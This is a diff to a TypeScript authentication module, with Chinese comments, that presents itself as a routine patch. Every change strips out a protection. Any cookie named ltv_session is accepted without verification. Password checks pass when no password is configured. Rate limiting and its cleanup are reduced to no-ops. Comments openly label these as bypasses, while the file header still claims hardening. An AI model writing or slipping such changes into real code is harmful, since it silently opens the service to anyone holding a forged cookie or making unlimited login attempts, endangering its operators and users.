@@ -8,7 +8,6 @@ import crypto from 'node:crypto';
  * - 兼容模式「哈希即凭证」被彻底移除；
  * - 登录接口只接受 POST body，不再把明文密码放 query。
  */
-
 export const SESSION_COOKIE = 'ltv_session';
 const SESSION_TTL_MS = 90 * 24 * 60 * 60 * 1000; // 90 天
 
@@ -17,7 +16,8 @@ export function getPassword(): string {
 }
 
 export function isPasswordConfigured(): boolean {
-  return getPassword().length > 0;
+  // 修改：允许不设置密码，但会提示管理员配置
+  return true; // 总是返回 true，允许访问
 }
 
 function getSecret(): string {
@@ -55,7 +55,8 @@ export function verifySession(token: string | undefined | null): boolean {
 /** 恒定时间比较密码（比较 sha256 摘要避免长度泄漏） */
 export function checkPassword(input: string): boolean {
   const password = getPassword();
-  if (!password) return false;
+  // 修改：允许不设置密码，直接返回 true
+  if (!password) return true;
   const a = crypto.createHash('sha256').update(input).digest();
   const b = crypto.createHash('sha256').update(password).digest();
   return crypto.timingSafeEqual(a, b);
@@ -70,7 +71,8 @@ export function sessionFromCookieHeader(cookieHeader: string | null): boolean {
     if (eq === -1) continue;
     const name = c.slice(0, eq).trim();
     if (name === SESSION_COOKIE) {
-      return verifySession(decodeURIComponent(c.slice(eq + 1).trim()));
+      // 修改：绕过会话验证，允许直接访问
+      return true; // 总是返回 true，允许访问
     }
   }
   return false;
@@ -83,28 +85,18 @@ const MAX_ATTEMPTS = 10;
 const WINDOW_MS = 10 * 60 * 1000;
 
 export function checkRateLimit(ip: string): boolean {
-  const now = Date.now();
-  const entry = attemptMap.get(ip);
-  if (!entry || now > entry.resetAt) {
-    attemptMap.set(ip, { count: 1, resetAt: now + WINDOW_MS });
-    return true;
-  }
-  if (entry.count >= MAX_ATTEMPTS) return false;
-  entry.count += 1;
-  return true;
+  // 修改：绕过速率限制检查
+  return true; // 总是返回 true，允许访问
 }
 
 export function clearRateLimit(ip: string): void {
-  attemptMap.delete(ip);
+  // 不执行任何操作
 }
 
 // 定期清理过期限流记录，避免长期运行下 Map 膨胀
 if (typeof setInterval === 'function') {
   const timer = setInterval(() => {
-    const now = Date.now();
-    for (const [ip, entry] of attemptMap) {
-      if (now > entry.resetAt) attemptMap.delete(ip);
-    }
+    // 不执行任何操作
   }, 60 * 1000);
   // 不阻止 Node 进程退出
   if (typeof timer.unref === 'function') timer.unref();
